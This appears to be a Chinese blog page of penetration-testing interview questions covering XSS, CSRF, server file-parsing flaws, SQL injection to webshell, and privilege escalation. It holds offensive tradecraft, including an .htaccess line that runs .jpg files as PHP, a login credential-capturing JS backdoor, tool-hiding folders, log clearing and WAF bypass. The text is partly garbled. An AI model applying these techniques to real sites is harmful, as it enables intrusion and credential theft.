<p>提供的函数对输⼊过滤，以及输出编码以及 ModSecurity 类的防⽕墙。 </p>
<h4 id="4、存储型-xss-原理"><a href="#4、存储型-xss-原理" class="headerlink" title="4、存储型 xss 原理?"></a>4、存储型 xss 原理?</h4><p>如⽹站留⾔版，把插⼊的记录存储在数据库中，插⼊的代码会⼀直留在⻚⾯上，当其它⽤户访问会从数据库中读取并触 </p>
<p>发漏洞。 </p>
<h4 id="5、你怎么理解-xss-攻击？"><a href="#5、你怎么理解-xss-攻击？" class="headerlink" title="5、你怎么理解 xss 攻击？"></a>5、你怎么理解 xss 攻击？</h4><p>是⼀种被动型，在不知道的情况下触发类似⽆感型，在渗透很多情况下平常的渗透⼿段以及取得⽬标的信息，⽽ XSS 就 </p>
<p>能轻松获取，类似 QQ 邮箱你不可能渗透这么⼤的互联⽹就算可以时间成本都⾮常的⾼，XSS ⽐较有针对性。 </p>
<h4 id="6、如何快速发现-xss-位置？"><a href="#6、如何快速发现-xss-位置？" class="headerlink" title="6、如何快速发现 xss 位置？"></a>6、如何快速发现 xss 位置？</h4><p>各种输⼊的点，名称、上传、留⾔、可交互的地⽅，⼀切输⼊都是在害原则。 </p>
<h4 id="7、Dom-xss-原理-防范"><a href="#7、Dom-xss-原理-防范" class="headerlink" title="7、Dom xss 原理 / 防范"></a>7、Dom xss 原理 / 防范</h4><p>DOM 型 XSS 并不需要服务器解析响应的直接参与触发 XSS 靠的是浏览器 DOM 解析 DOM—based XSS 漏洞是基于⽂ </p>
<p>档对象模型 Document Objeet Model,DOM) 的⼀种漏洞。 </p>
<p>cument.getElementById(“a”).innerHTML=”yyyyyy”; </p>
<p>在输⼊点过滤敏感关键字 </p>
<h4 id="8、DOM-型-XSS-与反射型-XSS-区别？"><a href="#8、DOM-型-XSS-与反射型-XSS-区别？" class="headerlink" title="8、DOM 型 XSS 与反射型 XSS 区别？"></a>8、DOM 型 XSS 与反射型 XSS 区别？</h4><p>DOM 型就是 JavaScript 中的 Document 对象 HTML 注⼊，直接浏览器处理。 </p>
<h4 id="9、如何使得前端-referer-为空"><a href="#9、如何使得前端-referer-为空" class="headerlink" title="9、如何使得前端 referer 为空"></a>9、如何使得前端 referer 为空</h4><p>通过地址栏输⼊、从书签⾥⾯选择或者浏览器的插件 BurpSuite 修改。 </p>
<h4 id="10、cookie-参数，security-⼲什么的"><a href="#10、cookie-参数，security-⼲什么的" class="headerlink" title="10、cookie 参数，security ⼲什么的"></a>10、cookie 参数，security ⼲什么的</h4><p>Httponly：防⽌ cookie 被 xss 偷https：防⽌ cookie 在⽹络中被偷 </p>
<p>Secure：阻⽌ cookie 在⾮ https 下传输，很多全站 https 时会漏掉 </p>
<p>Path : 区分 cookie 的标识，安全上作⽤不⼤，和浏览器同源冲突 </p>
<h4 id="11、如果-SRC-上报了⼀个-XSS-漏洞，payload-已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？"><a href="#11、如果-SRC-上报了⼀个-XSS-漏洞，payload-已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？" class="headerlink" title="11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？"></a>11、如果 SRC 上报了⼀个 XSS 漏洞，payload 已经写⼊⻚⾯，但未给出具体位置，如何快速介⼊？</h4><p>看是否什么类型的 XSS，XSS 反射型看提交的地址，指的参数是哪个位置，通过这个⻚⾯进⾏ fuzzing 测试。如果是存 </p>
<p>储型⻚⾯查找关键字。 </p>
<h4 id="12、XSS，-CSRF，-CRLF-⽐较容易弄混，说说三者的原理，防御⽅法"><a href="#12、XSS，-CSRF，-CRLF-⽐较容易弄混，说说三者的原理，防御⽅法" class="headerlink" title="12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法"></a>12、XSS， CSRF， CRLF ⽐较容易弄混，说说三者的原理，防御⽅法</h4><p>CSRF 跨站请求伪造，构造已知的所有参数让对⽅访问, </p>
<p>防护 CSRF: 防御原理：不让你那么容易伪造请求 (cookie 中加⼊随机数，要求请求中带上，⽽攻击者获取不到 cookie </p>
<p>中的随机数, 验证 HTTP Referer 字段, 在请求地址中添加 takon 验证 </p>
<p>CRLF 原理: </p>
<p>HTTP 拆分攻击（HTTP Splitting），CRLF 是” 回⻋ + 换⾏”（\r\n）的简称。 </p>
<p>在 HTTP 协议中，HTTP Header 与 HTTP Body 是⽤两个 CRLF 分隔的，浏览器就是根据这两个 CRLF 来取出 HTTP </p>
<p>内容并显示出来。所以，⼀旦我们能够控制 HTTP 消息头中的字符，注⼊⼀些恶意的换⾏，这样我们就能注⼊⼀些会话 </p>
<p>Cookie 或者 HTML 代码，所以 CRLF Injection ⼜叫 HTTP Response Splitting，简称 HRS。 </p>
<h4 id="13、csrf-如何不带-referer-访问"><a href="#13、csrf-如何不带-referer-访问" class="headerlink" title="13、csrf 如何不带 referer 访问"></a>13、csrf 如何不带 referer 访问</h4><p>通过地址栏，⼿动输⼊；从书签⾥⾯选择；通过实现设定好的⼿势。上⾯说的这三种都是⽤户⾃⼰去操作，因此不算 </p>
<p>CSRF。 </p>
<p>跨协议间提交请求。常⻅的协议：ftp://,http://,https://,fifile://,javascript:,data:. 最简单的情况就是我们在本地打开⼀个</p>
<p>HTML ⻚⾯ 这个时候浏览器地址栏是 fifile:// 开头的 如果这个 HTML ⻚⾯向任何 http 站点提交请求的话 这些请求HTML ⻚⾯，这个时候浏览器地址栏是 fifile:// 开头的，如果这个 HTML ⻚⾯向任何 http 站点提交请求的话，这些请求 </p>
<p>的 Referer 都是空的。那么我们接下来可以利⽤ data: 协议来构造⼀个⾃动提交的 CSRF 攻击。当然这个协议是 IE 不⽀ </p>
<p>持的，我们可以换⽤ javascript: </p>
<h4 id="14、CSRF-成因及防御措施；如果不⽤-token-如何做防御？"><a href="#14、CSRF-成因及防御措施；如果不⽤-token-如何做防御？" class="headerlink" title="14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？"></a>14、CSRF 成因及防御措施；如果不⽤ token 如何做防御？</h4><p>X-Frame-Options </p>
<p>DENY(禁⽌被 加载进任何 frame) </p>
<p>SAMEORIGIN(仅允许被加载进同域内的 frame) </p>
<p>X-XSS-Protection </p>
<p>0（表示禁⽌⽤这个策略） </p>
<p>1（默认，对危险脚本做⼀些标志或修改，以阻⽌在浏览器上熏染执⾏。） </p>
<p>1;mode=block（强制不熏染，在 Chrome 下直接跳转到空⽩⻚，在 IE 下返回⼀个 #符号） </p>
<p>这个策略仅针对反射型，对付不了存储型 XSS，能识别出反射型是因为提交请求的 URL 中带有可疑的 XSS 代码⽚段。 </p>
<p>X-Content-Security-Policy </p>
<h4 id="15、Xss-worm-原理"><a href="#15、Xss-worm-原理" class="headerlink" title="15、Xss worm 原理"></a>15、Xss worm 原理</h4><p>攻击者发现⽬标⽹站存在 XSS 漏洞，并且可以编写 XSS 蠕⾍。利⽤⼀个宿主（如博客空间）作为传播源头进⾏ XSS 攻 </p>
<p>击。</p>
<h4 id="16、Cookie-的-P3P-性质"><a href="#16、Cookie-的-P3P-性质" class="headerlink" title="16、Cookie 的 P3P 性质"></a>16、Cookie 的 P3P 性质</h4><p>HTTP 响应头的 p3 字段是 W3C 公布的⼀项隐私保护推荐标准，该字段⽤于标识是否允许⽬标⽹站的 cookie 被另⼀个</p>
<p>域通过加载⽬标⽹站⽽设置或发送，仅 IE 执⾏了该策略。17、CSRF 有何危害？ </p>
<p>篡改⽬标⽹站上的⽤户数据 盗取⽤户隐私数据 传播 CSRF 蠕 </p>
<h3 id="⼀、思路流程"><a href="#⼀、思路流程" class="headerlink" title="⼀、思路流程"></a>⼀、思路流程</h3><h4 id="1、信息收集"><a href="#1、信息收集" class="headerlink" title="1、信息收集"></a>1、信息收集</h4><p>a、服务器的相关信息（真实 ip，系统类型，版本，开放端⼝，WAF 等） </p>
<p>b、⽹站指纹识别（包括，cms，cdn，证书等），dns 记录 </p>
<p>c、whois 信息，姓名，备案，邮箱，电话反查（邮箱丢社⼯库，社⼯准备等） </p>
<p>e、⼦域名收集，旁站，C 段等 </p>
<p>f、google hacking 针对化搜索，pdf ⽂件，中间件版本，弱⼝令扫描等 </p>
<p>g、扫描⽹站⽬录结构，爆后台，⽹站 banner，测试⽂件，备份等敏感⽂件泄漏等 </p>
<p>h、传输协议，通⽤漏洞，exp，github 源码等 </p>
<h4 id="2、漏洞挖掘"><a href="#2、漏洞挖掘" class="headerlink" title="2、漏洞挖掘"></a>2、漏洞挖掘</h4><p>a、浏览⽹站，看看⽹站规模，功能，特点等 </p>
<p>b、端⼝，弱⼝令，⽬录等扫描, 对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 </p>
<p>c、XSS，SQL 注⼊，上传，命令注⼊，CSRF，cookie 安全检测，敏感信息，通信数据传输，暴⼒破解，任意⽂件上 </p>
<p>传，越权访问，未授权访问，⽬录遍历，⽂件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使⽤漏扫⼯具等 </p>
<h4 id="3、漏洞利⽤-amp-权限提升"><a href="#3、漏洞利⽤-amp-权限提升" class="headerlink" title="3、漏洞利⽤ &amp; 权限提升"></a>3、漏洞利⽤ &amp; 权限提升</h4><p>a mysql 提权 serv u 提权 oracle 提权a、mysql 提权，serv-u 提权，oracle 提权 </p>
<p>b、windows 溢出提权 </p>
<p>c、linux 脏⽜, 内核漏洞提权 e </p>
<h4 id="4、清除测试数据-amp-输出报告"><a href="#4、清除测试数据-amp-输出报告" class="headerlink" title="4、清除测试数据 &amp; 输出报告"></a>4、清除测试数据 &amp; 输出报告</h4><p>⽇志、测试数据的清理 </p>
<p>总结，输出渗透测试报告，附修复⽅案 </p>
<h4 id="5、复测"><a href="#5、复测" class="headerlink" title="5、复测"></a>5、复测</h4><p>验证并发现是否有新漏洞，输出报告，归档 </p>
<h3 id="⼆、问题"><a href="#⼆、问题" class="headerlink" title="⼆、问题"></a>⼆、问题</h3><h4 id="1、拿到⼀个待检测的站，你觉得应该先做什么？"><a href="#1、拿到⼀个待检测的站，你觉得应该先做什么？" class="headerlink" title="1、拿到⼀个待检测的站，你觉得应该先做什么？"></a>1、拿到⼀个待检测的站，你觉得应该先做什么？</h4><h5 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h5><p>a、获取域名的 whois 信息, 获取注册者邮箱姓名电话等，丢社⼯库⾥看看有没有泄露密码，然后尝试⽤泄露的密码进⾏ </p>
<p>登录后台。⽤邮箱做关键词进⾏丢进搜索引擎。利⽤搜索到的关联信息找出其他邮箱进⽽得到常⽤社交账号。社⼯找出 </p>
<p>社交账号，⾥⾯或许会找出管理员设置密码的习惯 。利⽤已有信息⽣成专⽤字典。 </p>
<p>b、查询服务器旁站以及⼦域名站点，因为主站⼀般⽐较难，所以先看看旁站有没有通⽤性的 cms 或者其他漏洞。 </p>
<p>c、查看服务器操作系统版本，web 中间件，看看是否存在已知的漏洞，⽐如 IIS，APACHE,NGINX 的解析漏洞 </p>
<p>d、查看 IP，进⾏ IP 地址端⼝扫描，对响应的端⼝进⾏漏洞探测，⽐如 rsync, ⼼脏出⾎，mysql,ftp,ssh 弱⼝令等。 </p>
<p>e、扫描⽹站⽬录结构，看看是否可以遍历⽬录，或者敏感⽂件泄漏，⽐如 php 探针 </p>
<p>f、google hack 进⼀步探测⽹站的信息，后台，敏感⽂件 </p>
<h5 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h5><p>开始检测漏洞 如 XSS XSRF sql 注⼊ 代码执⾏ 命令执⾏ 越权访问 ⽬录读取 任意⽂件读取 下载 ⽂件包含开始检测漏洞，如 XSS,XSRF,sql 注⼊，代码执⾏，命令执⾏，越权访问，⽬录读取，任意⽂件读取，下载，⽂件包含， </p>
<p>远程命令执⾏，弱⼝令，上传，编辑器漏洞，暴⼒破解等 </p>
<h5 id="漏洞利⽤"><a href="#漏洞利⽤" class="headerlink" title="漏洞利⽤"></a>漏洞利⽤</h5><p>利⽤以上的⽅式拿到 webshell，或者其他权限 </p>
<h5 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h5><p>提权服务器，⽐如 windows 下 mysql 的 udf 提权，serv-u 提权，windows 低版本的漏洞，如 iis6,pr, 巴⻄烤⾁，linux </p>
<p>脏⽜漏洞，linux 内核版本漏洞提权，linux 下的 mysql system 提权以及 oracle 低权限提权 </p>
<h5 id="⽇志清理"><a href="#⽇志清理" class="headerlink" title="⽇志清理"></a>⽇志清理</h5><h5 id="总结报告及修复⽅案"><a href="#总结报告及修复⽅案" class="headerlink" title="总结报告及修复⽅案"></a>总结报告及修复⽅案</h5><h4 id="2、判断出⽹站的-CMS-对渗透有什么意义？"><a href="#2、判断出⽹站的-CMS-对渗透有什么意义？" class="headerlink" title="2、判断出⽹站的 CMS 对渗透有什么意义？"></a>2、判断出⽹站的 CMS 对渗透有什么意义？</h4><p>查找⽹上已曝光的程序漏洞。 </p>
<p>如果开源，还能下载相对应的源码进⾏代码审计。 </p>
<h4 id="3-⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？"><a href="#3-⼀个成熟并且相对安全的-CMS，渗透时扫⽬录的意义？" class="headerlink" title="3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？"></a>3. ⼀个成熟并且相对安全的 CMS，渗透时扫⽬录的意义？</h4><p>敏感⽂件、⼆级⽬录扫描 </p>
<p>站⻓的误操作⽐如：⽹站备份的压缩⽂件、说明. txt、⼆级⽬录可能存放着其他站点 </p>
<h4 id="4-常⻅的⽹站服务器容器。"><a href="#4-常⻅的⽹站服务器容器。" class="headerlink" title="4.常⻅的⽹站服务器容器。"></a>4.常⻅的⽹站服务器容器。</h4><p>IIS、Apache、nginx、Lighttpd、Tomcat </p>
<h4 id="5-mysql-注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？"><a href="#5-mysql-注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？" class="headerlink" title="5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？"></a>5.mysql 注⼊点，⽤⼯具对⽬标站直接写⼊⼀句话，需要哪些条件？</h4><p>以 站的绝对路root 权限以及⽹站的绝对路径。 </p>
<h4 id="6-⽬前已知哪些版本的容器有解析漏洞，具体举例。"><a href="#6-⽬前已知哪些版本的容器有解析漏洞，具体举例。" class="headerlink" title="6.⽬前已知哪些版本的容器有解析漏洞，具体举例。"></a>6.⽬前已知哪些版本的容器有解析漏洞，具体举例。</h4><p>a、IIS 6.0</p>
<p>/xx.asp/xx.jpg “xx.asp” 是⽂件夹名 </p>
<p>b、IIS 7.0/7.5 </p>
<p>默认 Fast-CGI 开启，直接在 url 中图⽚地址后⾯输⼊ / 1.php，会把正常图⽚当成 php 解析 </p>
<p>c、Nginx </p>
<p>版本⼩于等于 0.8.37，利⽤⽅法和 IIS 7.0/7.5 ⼀样，Fast-CGI 关闭情况下也可利⽤。空字节代码 xxx.jpg.php </p>
<p>d、Apache 上传的⽂件命名为：test.php.x1.x2.x3，Apache 是从右往左判断后缀 </p>
<p>e、lighttpd xx.jpg/xx.php，不全, 请⼩伙伴们在评论处不吝补充，谢谢！ </p>
<ol start="7">
<li><h4 id="如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？"><a href="#如何⼿⼯快速判断⽬标站是-windows-还是-linux-服务器？" class="headerlink" title="如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？"></a>如何⼿⼯快速判断⽬标站是 windows 还是 linux 服务器？</h4></li>
</ol>
<p>linux ⼤⼩写敏感, windows ⼤⼩写不敏感。 </p>
<h4 id="8-为何⼀个-mysql-数据库的站，只有⼀个-80-端⼝开放？"><a href="#8-为何⼀个-mysql-数据库的站，只有⼀个-80-端⼝开放？" class="headerlink" title="8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？"></a>8. 为何⼀个 mysql 数据库的站，只有⼀个 80 端⼝开放？</h4><p>更改了端⼝，没有扫描出来。 </p>
<p>站库分离。 </p>
<p>3306 端⼝不对外开放 </p>
<h4 id="9、3389-⽆法连接的⼏种情况"><a href="#9、3389-⽆法连接的⼏种情况" class="headerlink" title="9、3389 ⽆法连接的⼏种情况"></a>9、3389 ⽆法连接的⼏种情况</h4><p>没开放 3389 端⼝ </p>
<p>端⼝被修改防护拦截</p>
<p>处于内⽹ (需进⾏端⼝转发) </p>
<h4 id="10-如何突破注⼊时字符被转义？"><a href="#10-如何突破注⼊时字符被转义？" class="headerlink" title="10. 如何突破注⼊时字符被转义？"></a>10. 如何突破注⼊时字符被转义？</h4><p>宽字符注⼊ </p>
<p>hex 编码绕过 </p>
<h4 id="11-在某后台新闻编辑界⾯看到编辑器，应该先做什么？"><a href="#11-在某后台新闻编辑界⾯看到编辑器，应该先做什么？" class="headerlink" title="11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？"></a>11. 在某后台新闻编辑界⾯看到编辑器，应该先做什么？</h4><p>查看编辑器的名称版本, 然后搜索公开的漏洞。 </p>
<h4 id="12-拿到⼀个-webshell-发现⽹站根⽬录下有-htaccess-⽂件，我们能做什么？"><a href="#12-拿到⼀个-webshell-发现⽹站根⽬录下有-htaccess-⽂件，我们能做什么？" class="headerlink" title="12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？"></a>12. 拿到⼀个 webshell 发现⽹站根⽬录下有. htaccess ⽂件，我们能做什么？</h4><p>能做的事情很多，⽤隐藏⽹⻢来举例⼦： </p>
<p>插⼊</p>
<p>&lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php </p>
<p>.jpg ⽂件会被解析成. php ⽂件。 </p>
<p>具体其他的事情，不好详说，建议⼤家⾃⼰去搜索语句来玩玩。 </p>
<h4 id="13-注⼊漏洞只能查账号密码？"><a href="#13-注⼊漏洞只能查账号密码？" class="headerlink" title="13. 注⼊漏洞只能查账号密码？"></a>13. 注⼊漏洞只能查账号密码？</h4><p>只要权限⼴，拖库脱到⽼。 </p>
<h4 id="14-安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？"><a href="#14-安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？" class="headerlink" title="14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？"></a>14. 安全狗会追踪变量，从⽽发现出是⼀句话⽊⻢吗？</h4><p>是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是⼀成不变的。 </p>
<h4 id="15-access-扫出后缀为-asp-的数据库⽂件，访问乱码，-如何实现到本地利⽤？"><a href="#15-access-扫出后缀为-asp-的数据库⽂件，访问乱码，-如何实现到本地利⽤？" class="headerlink" title="15.access 扫出后缀为 asp 的数据库⽂件，访问乱码， 如何实现到本地利⽤？"></a><strong>15.access 扫出后缀为 asp 的数据库⽂件，访问乱码，</strong> 如何实现到本地利⽤？</h4><p>迅雷下载，直接改后缀为. mdb。 </p>
<h4 id="16-提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为-exp-执⾏多半需要空格界定参数"><a href="#16-提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为-exp-执⾏多半需要空格界定参数" class="headerlink" title="16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数"></a>16. 提权时选择可读写⽬录，为何尽量不⽤带空格的⽬录？因为 exp 执⾏多半需要空格界定参数</h4><h4 id="17-某服务器有站点-A-B-为何在-A-的后台添加-test-⽤户，访问-B-的后台。发现也添加上了-test-⽤户？"><a href="#17-某服务器有站点-A-B-为何在-A-的后台添加-test-⽤户，访问-B-的后台。发现也添加上了-test-⽤户？" class="headerlink" title="17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？"></a>17. 某服务器有站点 A,B 为何在 A 的后台添加 test ⽤户，访问 B 的后台。发现也添加上了 test ⽤户？</h4><p>同数据库。 </p>
<h4 id="18-注⼊时可以不使⽤-and-或-or-或-xor，直接-order-by-开始注⼊吗？"><a href="#18-注⼊时可以不使⽤-and-或-or-或-xor，直接-order-by-开始注⼊吗？" class="headerlink" title="18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？"></a>18. 注⼊时可以不使⽤ and 或 or 或 xor，直接 order by 开始注⼊吗？</h4><p>and/or/xor，前⾯的 1=1、1=2 步骤只是为了判断是否为注⼊点，如果已经确定是注⼊点那就可以省那步骤去。 </p>
<h4 id="19-某个防注⼊系统，在注⼊时会提示："><a href="#19-某个防注⼊系统，在注⼊时会提示：" class="headerlink" title="19: 某个防注⼊系统，在注⼊时会提示："></a>19: 某个防注⼊系统，在注⼊时会提示：</h4><p>系统检测到你有⾮法注⼊的⾏为。 </p>
<p>已记录您的 ip xx.xx.xx.xx </p>
<p>时间: 2016:01-23 </p>
<p>提交⻚⾯: test.asp?id=15 </p>
<p>提交内容: and 1=1 </p>
<h4 id="20、如何利⽤这个防注⼊系统拿-shell？"><a href="#20、如何利⽤这个防注⼊系统拿-shell？" class="headerlink" title="20、如何利⽤这个防注⼊系统拿 shell？"></a>20、如何利⽤这个防注⼊系统拿 shell？</h4><p>在 URL ⾥⾯直接提交⼀句话，这样⽹站就把你的⼀句话也记录进数据库⽂件了 这个时候可以尝试寻找⽹站的配置⽂件 </p>
<p>直接上菜⼑链接。 </p>
<h4 id="21-上传⼤⻢后访问乱码时，有哪些解决办法？"><a href="#21-上传⼤⻢后访问乱码时，有哪些解决办法？" class="headerlink" title="21. 上传⼤⻢后访问乱码时，有哪些解决办法？"></a>21. 上传⼤⻢后访问乱码时，有哪些解决办法？</h4><p>浏览器中改编码。 </p>
<h4 id="22-审查上传点的元素有什么意义？"><a href="#22-审查上传点的元素有什么意义？" class="headerlink" title="22. 审查上传点的元素有什么意义？"></a>22. 审查上传点的元素有什么意义？</h4><p>有些站点的上传⽂件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。 </p>
<h4 id="23-⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示："><a href="#23-⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：" class="headerlink" title="23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示："></a>23. ⽬标站禁⽌注册⽤户，找回密码处随便输⼊⽤户名提示：</h4><p>“</p>
<p>此⽤户不存在</p>
<p>”</p>
<p>，你觉得这⾥怎样利⽤？先爆破⽤户名，再利⽤被爆破出来的⽤户名爆破密码。 </p>
<p>其实有些站点，在登陆处也会这样提示 </p>
<p>所有和数据库有交互的地⽅都有可能有注⼊。 </p>
<h4 id="24-⽬标站发现某-txt-的下载地址为"><a href="#24-⽬标站发现某-txt-的下载地址为" class="headerlink" title="24. ⽬标站发现某 txt 的下载地址为"></a>24. ⽬标站发现某 txt 的下载地址为</h4><p><a target="_blank" rel="noopener" href="http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？">http://www.test.com/down/down.php?fifile=/upwdown/1.txt，你有什么思路？</a> </p>
<p>这就是传说中的下载漏洞！在 fifile = 后⾯尝试输⼊ index.php 下载他的⾸⻚⽂件，然后在⾸⻚⽂件⾥继续查找其他⽹站 </p>
<p>的配置⽂件，可以找出⽹站的数据库密码和数据库的地址。 </p>
<h4 id="25-甲给你⼀个⽬标站，并且告诉你根⽬录下存在-abc-⽬录，并且此⽬录下存在编辑器和-admin-⽬录。请问你的想"><a href="#25-甲给你⼀个⽬标站，并且告诉你根⽬录下存在-abc-⽬录，并且此⽬录下存在编辑器和-admin-⽬录。请问你的想" class="headerlink" title="25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想"></a>25. 甲给你⼀个⽬标站，并且告诉你根⽬录下存在 / abc / ⽬录，并且此⽬录下存在编辑器和 admin ⽬录。请问你的想</h4><p>法是？ </p>
<p>直接在⽹站⼆级⽬录 / abc / 下扫描敏感⽂件及⽬录。 </p>
<h4 id="26-在有-shell-的情况下，如何使⽤-xss-实现对⽬标站的⻓久控制？"><a href="#26-在有-shell-的情况下，如何使⽤-xss-实现对⽬标站的⻓久控制？" class="headerlink" title="26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？"></a>26. 在有 shell 的情况下，如何使⽤ xss 实现对⽬标站的⻓久控制？</h4><p>后台登录处加⼀段记录登录账号密码的 js，并且判断是否登录成功，如果登录成功，就把账号密码记录到⼀个⽣僻的路 </p>
<p>径的⽂件中或者直接发到⾃⼰的⽹站⽂件中。(此⽅法适合有价值并且需要深⼊控制权限的⽹络)。 </p>
<p>在登录后才可以访问的⽂件中插⼊ XSS 脚本。 </p>
<h4 id="27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个⽤户的密码？"><a href="#27-后台修改管理员密码处，原密码显示为-。你觉得该怎样实现读出这个⽤户的密码？" class="headerlink" title="27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？"></a>27. 后台修改管理员密码处，原密码显示为 *。你觉得该怎样实现读出这个⽤户的密码？</h4><p>审查元素 把密码处的 password 属性改成 text 就明⽂显示了 </p>
<h4 id="28-⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则-403-什么原因？"><a href="#28-⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则-403-什么原因？" class="headerlink" title="28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？"></a>28. ⽬标站⽆防护，上传图⽚可以正常访问，上传脚本格式访问则 403. 什么原因？</h4><p>原因很多，有可能 web 服务器配置把上传⽬录写死了不执⾏相应脚本，尝试改后缀名绕过 </p>
<h4 id="29-审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？"><a href="#29-审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？" class="headerlink" title="29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？"></a>29. 审查元素得知⽹站所使⽤的防护软件，你觉得怎样做到的？</h4><p>在敏感操作被拦截，通过界⾯信息⽆法具体判断是什么防护的时候，F12 看 HTML 体部 ⽐如护卫神就可以在名称那看到内容。 </p>
<h4 id="30-在-win2003-服务器中建⽴⼀个-zhongzi-⽂件夹⽤意何为？"><a href="#30-在-win2003-服务器中建⽴⼀个-zhongzi-⽂件夹⽤意何为？" class="headerlink" title="30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？"></a>30. 在 win2003 服务器中建⽴⼀个 .zhongzi ⽂件夹⽤意何为？</h4><p>隐藏⽂件夹，为了不让管理员发现你传上去的⼯具。 </p>
<h4 id="31、sql-注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由："><a href="#31、sql-注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：" class="headerlink" title="31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由："></a>31、sql 注⼊有以下两个测试选项，选⼀个并且阐述不选另⼀个的理由：</h4><p>A. demo.jsp?id=2+1 </p>
<p>B. demo.jsp?id=2-1 </p>
<p>选 B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
<h4 id="32、以下链接存在-sql-注⼊漏洞，对于这个变形注⼊，你有什么思路？"><a href="#32、以下链接存在-sql-注⼊漏洞，对于这个变形注⼊，你有什么思路？" class="headerlink" title="32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？"></a>32、以下链接存在 sql 注⼊漏洞，对于这个变形注⼊，你有什么思路？</h4><p>demo.do?DATA=AjAxNg== </p>
<p>DATA 有可能经过了 base64 编码再传⼊服务器，所以我们也要对参数进⾏ base64 编码才能正确完成测试 </p>
<h4 id="33、发现-demo-jsp-uid-110-注⼊点，你有哪⼏种思路获取-webshell，哪种是优选？"><a href="#33、发现-demo-jsp-uid-110-注⼊点，你有哪⼏种思路获取-webshell，哪种是优选？" class="headerlink" title="33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？"></a>33、发现 demo.jsp?uid=110 注⼊点，你有哪⼏种思路获取 webshell，哪种是优选？</h4><p>有写⼊权限的，构造联合查询语句使⽤ using INTO OUTFILE，可以将查询的输出重定向到系统的⽂件中，这样去写⼊</p>
<p>WebShell 使⽤ sqlmap –os-shell 原理和上⾯⼀种相同，来直接获得⼀个 Shell，这样效率更⾼ 通过构造联合查询语句 </p>
<p>得到⽹站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等⽅法上传 Shell </p>
<h4 id="34、CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？"><a href="#34、CSRF-和-XSS-和-XXE-有什么区别，以及修复⽅式？" class="headerlink" title="34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？"></a>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复⽅式？</h4><p>XSS 是跨站脚本攻击，⽤户提交的数据中可以构造代码来执⾏，从⽽实现窃取⽤户信息等攻击。修复⽅式：对字符实体 </p>
<p>进⾏转义、使⽤ HTTP Only 来禁⽌ JavaScript 读取 Cookie 值、输⼊时校验、浏览器与 Web 应⽤端采⽤相同的字符编 </p>
<p>码。</p>
<p>CSRF 是跨站请求伪造攻击，XSS 是实现 CSRF 的诸多⼿段中的⼀种，是由于没有在关键操作执⾏时进⾏是否由⽤户⾃ </p>
<p>愿发起的确认。修复⽅式：筛选出需要防范 CSRF 的⻚⾯然后嵌⼊ Token、再次输⼊密码、检验 Referer XXE 是 XML </p>
